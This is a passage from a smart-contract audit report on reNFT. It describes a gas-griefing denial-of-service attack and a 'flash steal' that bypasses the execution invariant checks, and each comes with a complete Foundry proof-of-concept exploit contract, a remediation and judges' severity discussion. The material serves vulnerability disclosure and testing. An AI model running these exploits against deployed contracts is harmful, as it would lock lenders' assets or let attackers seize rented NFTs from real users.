    import "forge-std/console.sol";



    contract Exploit is Assertions, Constants, BaseTest {

        function test_analyzeGasUsage() public {

            // create a BASE order
            createOrder({
                offerer: alice,
                orderType: OrderType.BASE,
                erc721Offers: 1,
                erc1155Offers: 0,
                erc20Offers: 0,
                erc721Considerations: 0,
                erc1155Considerations: 0,
                erc20Considerations: 1
            });

            // finalize the order creation
            (
                Order memory order,
                bytes32 orderHash,
                OrderMetadata memory metadata
            ) = finalizeOrder();

            // create an order fulfillment
            createOrderFulfillment({
                _fulfiller: bob,
                order: order,
                orderHash: orderHash,
                metadata: metadata
            });

            // We acccess baseOrder.advancedOrder to add consideration items
            OrderParameters storage params = ordersToFulfill[0].advancedOrder.parameters;

            for (uint i = 0; i < 5000; i++) {
                params.consideration.push(ConsiderationItem({
                    itemType: ItemType.ERC20,
                    token: address(erc20s[0]),
                    identifierOrCriteria: 0,
                    startAmount: 1 wei,
                    endAmount: 1 wei,
                    recipient: payable(address(create))
                }));
            }

            /** ------------ Analysis of Gas usage during rental creation ------------ */

            uint256 gasBefore = gasleft(); // Track how much gas we have before renting.

            // Fulfill the BASE order
            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();

            uint256 gasAfter = gasleft(); // Track how much gas we have left after renting.

            console.log("Gas spent during rental creation: ", (gasBefore - gasAfter));



            /** ------------ Analysis of Gas usage during rental termination ------------ */

            // speed up in time past the rental expiration
            vm.warp(block.timestamp + 750);

            gasBefore = gasleft(); // Track how much gas we have before terminating the rental.
            
            stop.stopRent(rentalOrder);

            gasAfter = gasleft(); // Track how much gas we have left after terminating the rental.

            console.log("Gas spent during rental termination: ", (gasBefore - gasAfter));

        }


    }

</details>

### Exploit scenario / PoC

1. Alice lists a rental order with the offer item being a APE NFT with id 5 for rental with a duration of 15 days and she wants 100 USDC in exchange (consideration item).
2. Attacker borrows the rental order and during fulfillment, he tips `5000 x 0.00000000001` USDC tokens, so that the consideration array would have `>=` 5000 consideration items. Let's say that TX will cost the attacker 5 ETH (the function [`Create::_rentFromZone`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L573) will iterate through every single entry of the 5000 consideration items and transfer them to the escrow, that's why this will cost so much gas). Then the rental starts.
3. After the rental has expired, Alice decides to stop/terminate the rental to get her tokens back, only to be surprised that the call to [`Stop::stopRent()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Stop.sol#L263) reverts and that she will have to pay ~2.27 (5/2.20) ETH to stop the rental and get her tokens back!


### Coded PoC

To run the PoC, you'll need to do the following:
1. You'll need to add this file to the `test/` folder:  
    - `Exploit.sol` -> File containing the PoC.
2. You'll need to run this command: `forge test --mt test_considerationList_DoS -vv`.

**The file:**

<details>
<summary><b>Exploit.sol</b></summary>


    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {
        Order,
        FulfillmentComponent,
        Fulfillment,
        ItemType as SeaportItemType,
        CriteriaResolver,
        AdvancedOrder,
        OfferItem,
        ConsiderationItem,
        OrderComponents,
        OrderType as SeaportOrderType,
        OrderParameters,
        ItemType
    } from "@seaport-types/lib/ConsiderationStructs.sol";

    import {
        ZoneParameters
    } from "@seaport-core/lib/rental/ConsiderationStructs.sol";

    import {
        OfferItemLib,
        OrderComponentsLib,
        ConsiderationItemLib,
        OrderLib
    } from "@seaport-sol/SeaportSol.sol";

    import {Seaport} from "@seaport-core/Seaport.sol";
    import {ZoneInterface} from "@src/interfaces/IZone.sol";
    import {Zone} from "@src/packages/Zone.sol";
    import {TokenReceiver} from "@src/packages/TokenReceiver.sol";
    import {Errors} from "@src/libraries/Errors.sol";
    import {ISafe} from "@src/interfaces/ISafe.sol";

    import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStructs.sol";
    import {Events} from "@src/libraries/Events.sol";
    import {ECDSA} from "@openzeppelin-contracts/utils/cryptography/ECDSA.sol";

    import {ERC721} from '@openzeppelin-contracts/token/ERC721/ERC721.sol';
    import {IERC721} from '@openzeppelin-contracts/token/ERC721/IERC721.sol';
    import {Ownable} from "@openzeppelin-contracts/access/Ownable.sol";
    import {ERC1155} from '@openzeppelin-contracts/token/ERC1155/ERC1155.sol';
    import {IERC1155} from '@openzeppelin-contracts/interfaces/IERC1155.sol';
    import {IERC20} from '@openzeppelin-contracts/interfaces/IERC20.sol';

    import {ProtocolAccount} from "@test/utils/Types.sol";
    import {BaseTest} from "@test/BaseTest.sol";
    import {Assertions} from "@test/utils/Assertions.sol";
    import {Constants} from "@test/utils/Constants.sol";
    import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";
    import {Enum} from "@safe-contracts/common/Enum.sol";

    import "forge-std/console.sol";



    contract Exploit is Assertions, Constants, BaseTest {

        function test_considerationList_DoS() public {

            // create a BASE order
            createOrder({
                offerer: alice,
                orderType: OrderType.BASE,
                erc721Offers: 1,
                erc1155Offers: 0,
                erc20Offers: 0,
                erc721Considerations: 0,
                erc1155Considerations: 0,
                erc20Considerations: 1
            });

            // finalize the order creation
            (
                Order memory order,
                bytes32 orderHash,
                OrderMetadata memory metadata
            ) = finalizeOrder();

            // create an order fulfillment
            createOrderFulfillment({
                _fulfiller: bob,
                order: order,
                orderHash: orderHash,
                metadata: metadata
            });

            // We acccess baseOrder.advancedOrder to add consideration items
            OrderParameters storage params = ordersToFulfill[0].advancedOrder.parameters;

            for (uint i = 0; i < 3000; i++) {
                params.consideration.push(ConsiderationItem({
                    itemType: ItemType.ERC20,
                    token: address(erc20s[0]),
                    identifierOrCriteria: 0,
                    startAmount: 1 wei,
                    endAmount: 1 wei,
                    recipient: payable(address(create))
                }));
            }

            // Fulfill the BASE order
            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();

            /** ------------ Proof of exploitation ------------ */

            // speed up in time past the rental expiration
            vm.warp(block.timestamp + 750);
            
            // We expect the call to revert, because the gas the victim `alice` supplied isn't enough!
            vm.expectRevert();
            stop.stopRent{gas: 10000000}(rentalOrder);


        }


    }

</details>

### Coded Remediation

One easy way is to limit how many items can be in a consideration item list of a `BASE` order. You can enforce such limit by doing the following:

In the function [`_processBaseOrderConsideration()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L334) in the [`Create.sol`](https://github.com/re-nft/smart-contracts/blob/main/src/policies/Create.sol) contract, replace the first `if check`

```solidity
        // Must be at least one consideration item.
        if (considerations.length == 0) {
            revert Errors.CreatePolicy_ConsiderationCountZero();
        }
```
with

```solidity
        // Must be at least one consideration item.
        if (considerations.length == 0 || considerations.length > 50) {
            revert Errors.CreatePolicy_ConsiderationCountZero();
        }
```

### Assessed type

DoS

**[EV_om (warden) commented](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/28#issuecomment-1979014850):**
> > pay a hefty sum of money in gas and get to keep the tokens he rented as long as the lender does not pay ~50% of what the attacker has paid in gas, in order to stop the rental.
>
> Given the large cost of the exploit and the fact that the attacker derives no profit from it, I think this should be considered Medium severity at best.

**[sin1st3r__ (warden) commented](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/28#issuecomment-1979058365):**
> @EV_om -The attacker determines how much the asset is worth and decides to pay accordingly. If he determines that it's worth only paying 30 USDC in it, he'll rent it and supply an arbitrary number of tips that would cost him 30 USDC in gas.
>
>> attacker derives no profit from it
>
>That's not true, the attacker will get to keep the rented assets indefinitely as long as the victim decides not to pay the ransom (50% of what the attacker has paid).
>
>I definitely do believe it's a high because the attacker can rent any order and keep it indefinitely forcing the victim to pay a ransom to get his assets back. As a lender on the platform, I should simply be able to lend my assets without paying ransom to get them back.

**[gzeon (judge) commented](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/28#issuecomment-1979436995):**
> This is a valid griefing attack where the warden also gave a preliminary gas analysis. It is clear that the asset would not be permanently lost, but the victim would potentially need to pay up to 50% of the value of the NFT to regain control. I am keen to keep this as High risk given the high griefing ratio.

**[Alec1017 (reNFT) confirmed and commented](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/28#issuecomment-1979507358):**
> Would agree that this is a successful griefing attack with clear analysis on the cost of the victim being exceedingly large to get their asset back.

***

## [An attacker can flash steal rented NFTs by bypassing `_executionInvariantChecks()` checks](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/29)

*Submitted by [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/29).*

**Severity: Medium**

### Lines of code

https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L590

### Impact

This vulnerability allows an attacker to temporarily steal (flash steal) an NFT allowing him to bypass the hooks enforced by the lender of the NFT. Similar impact [here](https://github.com/code-423n4/2024-01-renft-findings/issues/466).

### The Vulnerability and Proof of Concept

The exploitation of this vulnerability relies on multiple primitives; however, the most important exploit primitive would be that the [`_executionInvariantChecks()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L590) function check can be bypassed if the address of the offerer of the rental order is the same as the address of the borrower (recipient). In this case, the seaport conduit does not conduct any token transfers and these transfers/executions aren't included in the `seaportPayload.totalExecutions` array which is fed into the [`_executionInvariantChecks()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L590) function. [`From seaport docs on matchOrders`](https://github.com/ProjectOpenSea/seaport/blob/main/docs/SeaportDocumentation.md#match-orders):

> Use either conduit or Seaport directly to source approvals, depending on the original order type.<br>
> Ignore each execution where to `==` from.

Because this is a sophisticated exploit, I'll break it down step by step:

0. Let's say the attacker is going to be hijacking NFT ID 5 in a legitimate `PAY` order lent by Alice. This will be a legitimate order with the following parameters:
    - Offer item #1: NFT ID 5.
    - Offer item #2: 100 ERC20 tokens.
    - Lender: Alice.
    - Borrower: `address_of_attackers_Rental_Safe`.
1. The attacker will construct a malicious `PAY` order. The `offerItems` of the order to be NFT ID 5, the 100 ERC20 tokens and the offerer (lender) of the order would be the attacker's rental safe, and the fulfiller would also be the rental safe. So in conclusion, the order will have the following parameters:
    - Offer item #1: NFT ID 5.
    - Offer item #2: 100 ERC20 tokens.
    - Lender: `address_of_attackers_Rental_Safe`.
    - Borrower: `address_of_attackers_Rental_Safe`.
2. The attacker will construct a useless `PAY` order and specify a zone contract he controls to be called. This order's only use is that it'll allow us to execute any zone contract we specify to it.
3. The attacker will call `matchAdvancedOrders` and supply the three pay orders to it in this order:
    - Order 1: The malicious `PAY` order constructed in step 1.
    - Order 2: The "malicious zone" `PAY` order allowing us to execute a custom zone contract.
    - Order 3: The legitimate `PAY` order where Alice is the lender.
4. Seaport will first conduct all the token transfers prior to calling any zones:
    - Attempt conducting transfers for order 1 (malicious order): No transfers will be made, because `recipient == offerer` / `to == from` (in other words).
    - Attempt conducting transfers for order 2 (malicious zone order): Won't conduct any transfers, you can construct it to not conduct transfers (shown in the PoC). But assuming you can't, this isn't really relevant to this exploit and won't affect it.
    - Attempt conducting transfers for order 3 (legitimate order): Two transfers will be made, the NFT ID 5 will be transferred from Alice to the `Create` policy and the 100 ERC20 tokens will also be transferred from Alice to the `Create` policy
5. After executing all the transfers associated with each of the three orders, seaport will begin interacting with the zone of each order, it will do the following:
    - Communicate with the zone associated with order 1 (malicious order): The zone associated with this order is the `Create` policy. Seaport will call `validateOrder()` and begin rental registeration. `validateOrder` will call the internal function `_rentFromZone()` which will begin the actual rental registeration process. What we care about is the `_executionInvariantChecks()` function:

        ```solidity

            function _rentFromZone(
                RentPayload memory payload,
                SeaportPayload memory seaportPayload
            ) internal {
                // Check: Only full restricted orders are supported.
                _isValidSeaportOrderType(seaportPayload.orderType);

                // Check: The payload is being used for the correct order.
                _isValidPayloadForOrder(payload.orderHash, seaportPayload.orderHash);

                // Check: make sure order metadata is valid with the given seaport order zone hash.
                _isValidOrderMetadata(payload.metadata, seaportPayload.zoneHash);

                // Check: verify the fulfiller of the order is an owner of the recipient safe.
                _isValidSafeOwner(seaportPayload.fulfiller, payload.fulfillment.recipient);

                // Check: verify each execution was sent to the expected destination.
        ----->  _executionInvariantChecks(seaportPayload.totalExecutions);
        ```

        ```solidity

            function _executionInvariantChecks(ReceivedItem[] memory executions) internal view {
        ------> for (uint256 i = 0; i < executions.length; ++i) {
                    ReceivedItem memory execution = executions[i];

                    // All tokens must first be sent to the Create Policy.
                    if (execution.recipient != address(this)) {
                        revert Errors.CreatePolicy_UnexpectedTokenRecipient(
                            execution.itemType,
                            execution.token,
                            execution.identifier,
                            execution.amount,
                            execution.recipient,
                            address(this)
                        );
                    }
                }
            }
        ```

        In `_executionInvariantChecks()`, the `executions` won't have any entries, because no transfers were conducted when the seaport conduit attempted to conduct the transfers associated with this order (Point 4.1).

        With that being said, the `items` array which holds the offer & consideration (if any) items associated with the order will NOT be empty and will be contain the offer & consideration items associated with the order. When we constructed the malicious order, we set two offer items: the NFT ID 5 and the 100 ERC20 tokens.

        ```solidity

                bytes32 orderHash = _deriveRentalOrderHash(order);

                // Interaction: Update storage only if the order is a Base Order or Pay order.
                STORE.addRentals(orderHash, _convertToStatic(rentalAssetUpdates), items);

                // Interaction: Send tokens to their expected destinations. The rented assets
                // will go to the rental wallet and the payments will go to the escrow.
        ------> for (uint256 i = 0; i < items.length; ++i) {
                    Item memory item = items[i];

        -------->   if (item.isERC20()) {
                        // Send tokens to the payment escrow.
                        item.token.transferERC20(address(ESCRW), item.amount);

                        // increase deposit on the escrow
                        ESCRW.increaseDeposit(item.token, item.amount);
        ------->    } else if (item.isERC721()) {
                        // Send ERC721 to the rental wallet.
                        item.transferERC721(order.rentalWallet);
        ------->    } else if (item.isERC1155()) {
                        // Send ERC1155 to the rental wallet.
                        item.transferERC1155(order.rentalWallet);
                    }
                }
        ```

        Seaport will iterate through them and transfer the NFT to the rental wallet (in this case, it's the attacker's rental wallet), and it will transfer the ERC20 to the payment escrow contract. Then, the rental will begin normally.
    - After seaport has communicated with the zone associated with the first order, it'll go ahead and talk to the zone of the 2nd order (which is the malicious zone order we constructed). It'll communicate with a malicious zone that is attacker controlled.
        - The malicious zone will do three things:
            1. It'll stop the malicious pay order rental (so that we can transfer the ERC721 and ERC20 out of the rental safe). Since the owner of the PAY order is the attacker's rental safe, the malicious zone will utilize a pre-signed `stopRent` TX (shown in PoC), call `execTransaction` on the attacker's rental safe and feed it the pre-signed `stopRent` TX (shown in PoC).
            2. It'll transfer the ERC721 and ERC20 tokens from the attacker's rental safe to the malicious zone contract to do whatever it wants with it (bypass hook restrictions). It'll do so by utilizing a pre-signed `transferFrom` TX (shown in PoC), like the previous step.
            3. After the malicious zone does whatever it wants with the tokens (bypass hook restrictions), it'll transfer them back to the create policy to allow for the legitimate order to be registered normally without reverting.
    - After seaport has communicated with the zone associated with the first order, it'll go ahead and talk to the zone of the 3rd and final order which is the actual legitimate order. It'll communicate with the Create Policy zone which will continue the execution flow and the legitimate rental order will start.

This exploit relies on three exploit primitives:
1. All seaport transfers happen prior to interaction with zones.
2. An attacker can hijack the execution flow by creating an order that interacts with a custom zone of his.
3. `_executionInvariantChecks` can be bypassed if `to == from`.
 
Here is the order of all the operations which occur:

TRANSFER #1: `MaliciousPayOrder` (No token transfers occur).<br>
TRANSFER #2: `MaliciousZoneOrder` (No token transfers occur).<br>
TRANSFER #3: `LegitimateOrder` (Token transfers occur).<br>
ZONE_INTERACTION #4: `MaliciousPayOrder` (Create Policy).<br>
ZONE_INTERACTION #5: `MaliciousZoneOrder` (Malicious Zone).<br>
ZONE_INTERACTION #6: `LegitimateOrder` (Create Policy).

### Coded PoC

To run the PoC, you'll need to do the following:
1. You'll need to add this file to the `test/` folder:  
    - `Exploit.sol` -> File containing the PoC.
2. You'll need to run this command: `forge test --mt test_FlashSteal_NFT -vv`.

**The file:**

<details>
<summary><b>Exploit.sol</b></summary>


    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {
        Order,
        FulfillmentComponent,
        Fulfillment,
        ItemType as SeaportItemType,
        CriteriaResolver,
        AdvancedOrder,
        OfferItem,
        ConsiderationItem,
        OrderComponents,
        OrderType as SeaportOrderType,
        ItemType
    } from "@seaport-types/lib/ConsiderationStructs.sol";

    import {
        ZoneParameters
    } from "@seaport-core/lib/rental/ConsiderationStructs.sol";

    import {
        OfferItemLib,
        OrderComponentsLib,
        ConsiderationItemLib,
        OrderLib
    } from "@seaport-sol/SeaportSol.sol";

    import {Seaport} from "@seaport-core/Seaport.sol";
    import {ZoneInterface} from "@src/interfaces/IZone.sol";
    import {Zone} from "@src/packages/Zone.sol";
    import {TokenReceiver} from "@src/packages/TokenReceiver.sol";
    import {Errors} from "@src/libraries/Errors.sol";
    import {ISafe} from "@src/interfaces/ISafe.sol";

    import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStructs.sol";
    import {Events} from "@src/libraries/Events.sol";
    import {ECDSA} from "@openzeppelin-contracts/utils/cryptography/ECDSA.sol";

    import {ERC721} from '@openzeppelin-contracts/token/ERC721/ERC721.sol';
    import {IERC721} from '@openzeppelin-contracts/token/ERC721/IERC721.sol';
    import {Ownable} from "@openzeppelin-contracts/access/Ownable.sol";
    import {ERC1155} from '@openzeppelin-contracts/token/ERC1155/ERC1155.sol';
    import {IERC1155} from '@openzeppelin-contracts/interfaces/IERC1155.sol';
    import {IERC20} from '@openzeppelin-contracts/interfaces/IERC20.sol';

    import {ProtocolAccount} from "@test/utils/Types.sol";
    import {BaseTest} from "@test/BaseTest.sol";
    import {Assertions} from "@test/utils/Assertions.sol";
    import {Constants} from "@test/utils/Constants.sol";
    import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";
    import {Enum} from "@safe-contracts/common/Enum.sol";

    import "forge-std/console.sol";



    contract Exploit is Assertions, Constants, BaseTest {

        using OfferItemLib for OfferItem;
        using ConsiderationItemLib for ConsiderationItem;
        using OrderComponentsLib for OrderComponents;
        using OrderLib for Order;
        using ECDSA for bytes32;


        address public ERC721TokenToFlashSteal;
        address public ERC20TokenToReturnToCreatePolicyAfterTheft;

        MaliciousZone public maliciousZone;

        function test_FlashSteal_NFT() public {

            // This will be the token we will be flash stealing. In other words, it will be the token Alice (the victim lender), will be lending
            //      to bob, the attacker.
            ERC721TokenToFlashSteal = address(erc721s[0]);

            // Alice will be rewarding bob with erc20 for the PAY order so those also will be flash stolen (although flash stealing erc20 is useless)
            ERC20TokenToReturnToCreatePolicyAfterTheft = address(erc20s[0]);

            // Deploy the malicious zone contract
            maliciousZone = new MaliciousZone(
                address(bob.safe), 
                address(stop),
                address(create), 
                ERC721TokenToFlashSteal,
                ERC20TokenToReturnToCreatePolicyAfterTheft
            );

            // Construct the malicious PAY order, where bob will be lending himself.
            // The lender will be bob's rental safe and the borrower will be bob's rental safe as well.
            // The recipient will be the same as the offerer, so `executionInvariantChecks` will be bypassed.
            // The offer item will be set to the same NFT as the ones Alice will be lending Bob (aka, the NFT we will be hijacking).
            // This order will be executed first.
            constructMaliciousPAYOrder();
            
            // This is just a useless intermediary order just so that we get to execute a malicious zone contract of ours between
            //     the execution of the malicious pay order and the legitimate. So with this order, we're just hijacking the execution flow
            constructMaliciousZoneOrder();


            // This is the legitimate PAY order, where Alice will be lending Bob (attacker), an NFT and ERC20 which will both be flash stolen.
            constructLegitimatePAYOrder();
            

            // Prepare to fulfill all three orders
            (
                RentalOrder memory maliciousRentalOrder,
                RentalOrder memory maliciousZoneRentalOrder,
                RentalOrder memory legitimateRentalOrder
                
            ) = prepareOrdersForFulfilling();


            // Prepare the pre-signed TXs which the intermediary malicious zone contract will execute.
            preparePreSignedTXs(maliciousRentalOrder);


            // Fulfill all three orders and begin exploitation!!!!
            fulfillAllOrders();




        }


        function preparePreSignedTXs(RentalOrder memory maliciousRentalOrder) public {

            /** ---------------------- First TX ---------------------- */

            // TX call data to stop the rental once we arrive at the malicious zone
            bytes memory transaction = abi.encodeWithSelector(
                stop.stopRent.selector,
                maliciousRentalOrder
            );

            (uint8 v, bytes32 r, bytes32 s) = vm.sign(

                bob.privateKey, 

                ISafe(address(bob.safe)).getTransactionHash(
                    address(stop),
                    0 ether,
                    transaction,
                    Enum.Operation.Call,
                    0 ether,
                    0 ether,
                    0 ether,
                    address(0),
                    payable(address(0)),
                    ISafe(address(bob.safe)).nonce()
                )
                
            );

            bytes memory transactionSignature = abi.encodePacked(r, s, v); // Signature of the TX of rental stopping.

            // Setting those values on the malicious zone contract
            maliciousZone.setStopRentTXSignature(transactionSignature);
            maliciousZone.setStopRentTXCalldata(transaction);


            /** ---------------------- Second TX ---------------------- */

            // TX call data to transfer the flash stolen NFT back to the Create Policy after we're done using it.
            transaction = abi.encodeWithSelector(
                IERC721.transferFrom.selector,
                address(bob.safe),
                address(maliciousZone),
                1
            );


            (v, r, s) = vm.sign(

                bob.privateKey, 

                ISafe(address(bob.safe)).getTransactionHash(
                    address(ERC721TokenToFlashSteal),
                    0 ether,
                    transaction,
                    Enum.Operation.Call,
                    0 ether,
                    0 ether,
                    0 ether,
                    address(0),
                    payable(address(0)),
                    ISafe(address(bob.safe)).nonce()+1
                )
            );
            
            transactionSignature = abi.encodePacked(r, s, v); // Signature of the ERC721 token transferal TX.

            // Setting those values on the malicious zone contract.
            maliciousZone.setTransferFromERC721TXSignature(transactionSignature);
            maliciousZone.setTransferFromERC721TXCalldata(transaction);


            /** ---------------------- Third TX ---------------------- */

            // TX call data to transfer the flash stolen ERC20 back to the Create Policy.
            transaction = abi.encodeWithSelector(
                IERC20.transfer.selector,
                address(create),
                100
            );


            (v, r, s) = vm.sign(

                bob.privateKey, 

                ISafe(address(bob.safe)).getTransactionHash(
                    address(ERC20TokenToReturnToCreatePolicyAfterTheft),
                    0 ether,
                    transaction,
                    Enum.Operation.Call,
                    0 ether,
                    0 ether,
                    0 ether,
                    address(0),
                    payable(address(0)),
                    ISafe(address(bob.safe)).nonce()+2
                )
            );
            
            transactionSignature = abi.encodePacked(r, s, v);  // Signature of the ERC20 token transferal TX.

            // Setting those values on the malicious zone contract
            maliciousZone.setTransferFromERC20TXSignature(transactionSignature);
            maliciousZone.setTransferFromERC20TXCalldata(transaction);

        }


        // Construct the malicious PAY order
        function constructMaliciousPAYOrder() public returns(Order memory payOrder, bytes32 payOrderHash, OrderMetadata memory payOrderMetadata) {

            // Cache bob's original EOA address.
            address bobsOriginalEOA_Address = bob.addr;

            // We're making this fixture because we want bob's rental safe to be the lender (smart contract), not bob himself (EOA).
            bob.addr = address(bob.safe);

            // create a legit PAY order
            createOrder({
                offerer: bob,
                orderType: OrderType.PAY,
                erc721Offers: 1,
                erc1155Offers: 0,
                erc20Offers: 1,
                erc721Considerations: 0,
                erc1155Considerations: 0,
                erc20Considerations: 0
            });

            // Reset the value back.
            bob.addr = bobsOriginalEOA_Address;

            popOfferItem(); // Remove the pre-inserted ERC721 offer item
            popOfferItem(); // Remove the pre-inserted ERC20 offer item

            withOfferItem(
                OfferItemLib
                    .empty()
                    .withItemType(ItemType.ERC721)
                    .withToken(address(ERC721TokenToFlashSteal))
                    .withIdentifierOrCriteria(1)
                    .withStartAmount(1)
                    .withEndAmount(1)
            );
            withOfferItem(
                OfferItemLib
                    .empty()
                    .withItemType(ItemType.ERC20)
                    .withToken(address(erc20s[0]))
                    .withIdentifierOrCriteria(0)
                    .withStartAmount(100)
                    .withEndAmount(100)
            );


            // create and sign the order
            (Order memory payOrder, bytes32 payOrderHash) = _signSeaportOrderForGnosisSafeBeingALender(
                orderToCreate.offerer,
                orderToCreate.offerItems,
                orderToCreate.considerationItems,
                orderToCreate.metadata
            );

            // pull order metadata into memory
            OrderMetadata memory payOrderMetadata = orderToCreate.metadata;

            // clear structs
            resetOrderToCreate();

            // create an order fulfillment for the pay order
            createOrderFulfillment({
                _fulfiller: bob,
                order: payOrder,
                orderHash: payOrderHash,
                metadata: payOrderMetadata
            });


            // create a malicious PAYEE order.
            createOrder({
                offerer: bob,
                orderType: OrderType.PAYEE,
                erc721Offers: 0,
                erc1155Offers: 0,
                erc20Offers: 0,
                erc721Considerations: 1,
                erc1155Considerations: 0,
                erc20Considerations: 1
            });

            
            // We will remove the pre-inserted consideration items because the recipients are set to the Create policy,
            //   and we want them to be set to bob (the attacker), so that the offerer == recipient and `executionInvariantChecks` are bypassed.

            popConsiderationItem(); // Remove the pre-inserted ERC721 consideration item
            popConsiderationItem(); // Remove the pre-inserted ERC20 consideration item

            withConsiderationItem(
                ConsiderationItemLib
                    .empty()
                    .withItemType(ItemType.ERC721)
                    .withToken(address(ERC721TokenToFlashSteal))
                    .withIdentifierOrCriteria(1)
                    .withStartAmount(1)
                    .withEndAmount(1)
                    .withRecipient(address(bob.safe)) // Set the recipient to be the same as the offerer
            );
            withConsiderationItem(
                ConsiderationItemLib
                    .empty()
                    .withItemType(ItemType.ERC20)
                    .withToken(address(erc20s[0]))
                    .withIdentifierOrCriteria(0)
                    .withStartAmount(100)
                    .withEndAmount(100)
                    .withRecipient(address(bob.safe)) // Set the recipient to be the same as the offerer
            );


            // finalize the pay order creation
            (
                Order memory payeeOrder,
                bytes32 payeeOrderHash,
                OrderMetadata memory payeeOrderMetadata
            ) = finalizeOrder();

            // create an order fulfillment for the payee order
            createOrderFulfillment({
                _fulfiller: bob,
                order: payeeOrder,
                orderHash: payeeOrderHash,
                metadata: payeeOrderMetadata
            });

            withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});



        }

        // Construct the legitimate PAY order
        function constructLegitimatePAYOrder() public returns(Order memory payOrder, bytes32 payOrderHash, OrderMetadata memory payOrderMetadata) {

            // create a PAY order
            createOrder({
                offerer: alice,
                orderType: OrderType.PAY,
                erc721Offers: 1,
                erc1155Offers: 0,
                erc20Offers: 1,
                erc721Considerations: 0,
                erc1155Considerations: 0,
                erc20Considerations: 0
            });

            // finalize the pay order creation
            (
                Order memory payOrder,
                bytes32 payOrderHash,
                OrderMetadata memory payOrderMetadata
            ) = finalizeOrder();

            // create a PAYEE order. The fulfiller will be the offerer.
            createOrder({
                offerer: bob,
                orderType: OrderType.PAYEE,
                erc721Offers: 0,
                erc1155Offers: 0,
                erc20Offers: 0,
                erc721Considerations: 1,
                erc1155Considerations: 0,
                erc20Considerations: 1
            });

            // finalize the pay order creation
            (
                Order memory payeeOrder,
                bytes32 payeeOrderHash,
                OrderMetadata memory payeeOrderMetadata
            ) = finalizeOrder();

            // create an order fulfillment for the pay order
            createOrderFulfillment({
                _fulfiller: bob,
                order: payOrder,
                orderHash: payOrderHash,
                metadata: payOrderMetadata
            });

            // create an order fulfillment for the payee order
            createOrderFulfillment({
                _fulfiller: bob,
                order: payeeOrder,
                orderHash: payeeOrderHash,
                metadata: payeeOrderMetadata
            });

            withLinkedPayAndPayeeOrders({payOrderIndex: 3, payeeOrderIndex: 4});



        }

        // Construct the malicious zone order. It's a useless order, 
        //   we're just making it because it'll allow us to execute a zone of our choice and hijack the execution flow.
        function constructMaliciousZoneOrder() public {

            OrderComponentsLib
                .empty()
                .withOrderType(SeaportOrderType.FULL_RESTRICTED)
                .withZone(address(maliciousZone))
                .withStartTime(block.timestamp)
                .withEndTime(block.timestamp+500)
                .withSalt(10291312143)
                .withConduitKey(conduitKey)
                .saveDefault("malicious");
            
            orderToCreate.offerer = bob;
            
            orderToCreate.metadata.orderType = OrderType.BASE;
            orderToCreate.metadata.rentDuration = 300;
            orderToCreate.metadata.emittedExtraData = new bytes(0);
    
            OrderComponents memory orderComponents = OrderComponentsLib
                .fromDefault("malicious")
                .withOfferer(bob.addr)
                .withCounter(seaport.getCounter(bob.addr));
    
            bytes32 exploitOrderHash = seaport.getOrderHash(orderComponents);
    
            bytes memory signature = _signOrder(bob.privateKey, exploitOrderHash);
    
            Order memory exploitOrder = OrderLib
                .empty()
                .withParameters(orderComponents.toOrderParameters())
                .withSignature(signature);
    
            // create an order fulfillment
            createOrderFulfillment({
                _fulfiller: bob,
                order: exploitOrder,
                orderHash: exploitOrderHash,
                metadata: orderToCreate.metadata
            });

        }


        // Fulfill all three orders
        function fulfillAllOrders() public returns(RentalOrder memory legitimateRentalOrder, RentalOrder memory maliciousRentalOrder) {

            // the offerer of the PAYEE order fulfills the orders.
            vm.prank(fulfiller.addr);

            // fulfill the orders
            seaport.matchAdvancedOrders(
                deconstructOrdersToFulfill(),
                new CriteriaResolver[](0),
                seaportMatchOrderFulfillments,
                seaportRecipient
            );

            // clear structs
            resetFulfiller();
            resetOrdersToFulfill();
            resetSeaportMatchOrderFulfillments();

        }

        // Prepare orders for fulfilling by matching the PAY and PAYEE orders
        function prepareOrdersForFulfilling() public returns(RentalOrder memory, RentalOrder memory, RentalOrder memory) {

            // get the orders to fulfill

            OrderToFulfill memory maliciousPAYRentalOrder = ordersToFulfill[0];
            OrderToFulfill memory payeeOrder1 = ordersToFulfill[1];

            OrderToFulfill memory maliciousZoneOrder = ordersToFulfill[2];

            OrderToFulfill memory legitimatePAYOrder = ordersToFulfill[3];
            OrderToFulfill memory payeeOrder2 = ordersToFulfill[4];

            // create rental orders

            RentalOrder memory maliciousRentalOrder = _createRentalOrder(maliciousPAYRentalOrder);
            _createRentalOrder(payeeOrder1);

            RentalOrder memory maliciousZoneRentalOrder = _createRentalOrder(maliciousZoneOrder);

            RentalOrder memory legitimateRentalOrder = _createRentalOrder(legitimatePAYOrder);
            _createRentalOrder(payeeOrder2);


            return (maliciousRentalOrder, maliciousZoneRentalOrder, legitimateRentalOrder);

        }

        // Internal helper function
        function deconstructOrdersToFulfill()
            private
            view
            returns (AdvancedOrder[] memory advancedOrders)
        {
            // get the length of the orders to fulfill
